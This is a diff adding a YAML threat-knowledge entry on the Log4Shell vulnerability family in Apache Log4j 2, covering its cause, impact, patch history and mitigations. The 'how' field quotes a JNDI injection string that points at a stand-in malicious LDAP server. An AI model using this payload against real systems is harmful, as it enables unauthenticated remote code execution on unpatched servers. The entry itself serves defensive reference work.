@@ -1,0 +1,82 @@
+# GR Atom: Log4Shell
+# Schema: atom_schema.yaml v5.1
+# Status: enriched
+
+identity:
+  id: "VUL-INJECT-LOG4SHELL-001"
+  name: "Log4Shell"
+  normalized_name: "log4shell"
+  aliases:
+    - "Log4j Vulnerability"
+    - "Log4j RCE Family"
+    - "Log4j Crisis"
+
+classification:
+  is_infrastructure: false
+  type: "vulnerability"
+  abstraction_level: 1
+  atom_tags:
+    - INJ
+    - EXEC
+    - INITIAL
+    - WEB
+    - SUPPLY_CHAIN
+
+scope:
+  target_layers: ["L5", "L6", "L7"]
+  target_zones: ["Z2", "Z3", "Z4"]
+  target_components:
+    - "Apache Log4j 2.x"
+    - "Java Applications"
+    - "Enterprise Software Stack"
+    - "Cloud Services"
+
+definition:
+  what: "Log4Shell is the widely recognized name for the critical vulnerability family centered on CVE-2021-44228 in Apache Log4j 2, a pervasive Java logging framework. The name Log4Shell encapsulates the original JNDI injection RCE vulnerability and its related follow-on CVEs (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) that were discovered during the remediation process. The Log4Shell crisis represents one of the most significant cybersecurity events in history due to the extreme ubiquity of the affected library across global IT infrastructure. CVSS v3: 10.0 (Critical). Disclosed December 2021."
+  why: "Log4Shell became a defining cybersecurity event because Apache Log4j is embedded as a transitive dependency in an estimated hundreds of thousands of Java applications worldwide, spanning enterprise systems, cloud services, embedded devices, and open-source projects. The vulnerability was trivially exploitable, required no authentication, and provided immediate remote code execution. The software supply chain impact was unprecedented, as organizations struggled to identify all instances of Log4j across their environments. Nation-state threat actors, ransomware operators, and cryptomining groups began mass exploitation within hours of disclosure. The incident catalyzed global conversations about software supply chain security and open-source maintainer support."
+  how: "The Log4Shell attack chain exploits Log4j's JNDI message lookup substitution feature. Attackers inject strings containing ${jndi:ldap://malicious-server/exploit} into any input that gets processed by Log4j logging calls. The library resolves the JNDI expression by connecting to the specified remote server, which delivers a malicious Java class for execution. Attack vectors include HTTP headers, URL parameters, form inputs, and any protocol data that reaches a logging statement. The remediation effort required multiple Log4j releases: 2.15.0 (initial incomplete fix), 2.16.0 (disabled lookups by default), and 2.17.0 (final comprehensive fix). Organizations also employed virtual patching via WAF rules, network-level blocking of outbound JNDI connections, and removal of the JndiLookup class from Log4j JARs."
+  core_concepts:
+    - key: "JNDI Injection Chain"
+      value: "The core attack mechanism exploits Log4j's message lookup substitution to trigger JNDI resolution, connecting to attacker-controlled naming services that deliver malicious Java objects for deserialization and code execution"
+    - key: "Software Supply Chain Crisis"
+      value: "Log4Shell exposed the fragility of software supply chains, as a vulnerability in a single ubiquitous logging library created a global remediation crisis affecting virtually every Java-based system"
+    - key: "Multi-CVE Remediation"
+      value: "The initial fix for CVE-2021-44228 was incomplete, spawning follow-on CVEs (45046, 45105, 44832) that required successive patches, highlighting the difficulty of comprehensively fixing deeply embedded vulnerabilities"
+
+relations:
+  - type: instance_of
+    target: "VUL-INJECT-CVE202144228-001"
+    description: "Log4Shell is the common name for the CVE-2021-44228 vulnerability and its related Log4j CVE family"
+  - type: is_a
+    target: "VUL-INJECT-INJECTION-001"
+    description: "Log4Shell is a JNDI injection vulnerability in the injection vulnerability class"
+
+security_profile:
+  mitre_mapping:
+    technique_id: "T1190"
+    tactic: ["Initial Access"]
+
+metadata:
+  created: "2026-02-06"
+  updated: "2026-02-11"
+  version: "1.0"
+  confidence: "high"
+  trust_source: "authoritative"
+  sources:
+    - "CVE-2021-44228 - NVD NIST"
+    - "Apache Log4j Security Advisories"
+    - "CISA Emergency Directive 22-02"
+    - "CISA Alert AA21-356A - Mitigating Log4Shell"
+    - "Swiss Government NCSC Log4j Advisory"
+    - "MITRE ATT&CK T1190"
+  search_keywords:
+    - "Log4Shell"
+    - "Log4j vulnerability"
+    - "Log4j crisis"
+    - "Log4j RCE"
+    - "JNDI injection Log4j"
+    - "Apache Log4j security"
+    - "Log4j supply chain"
+    - "Log4j remediation"
+    - "Java logging vulnerability"
+  embedding_text: "Log4Shell is the widely recognized name for the critical vulnerability family centered on CVE-2021-44228 in Apache Log4j 2. Disclosed in December 2021 with a CVSS score of 10.0, it represents one of the most significant cybersecurity events in history. The vulnerability exploits JNDI message lookup substitution in the ubiquitous Java logging library to achieve unauthenticated remote code execution. Log4j is embedded in hundreds of thousands of Java applications across enterprise systems, cloud services, and embedded devices. The remediation effort required multiple successive patches as initial fixes proved incomplete, spawning CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832. Nation-state actors, ransomware groups, and cryptominers exploited Log4Shell within hours of disclosure. The incident catalyzed global focus on software supply chain security. Maps to MITRE ATT&CK T1190 Initial Access."
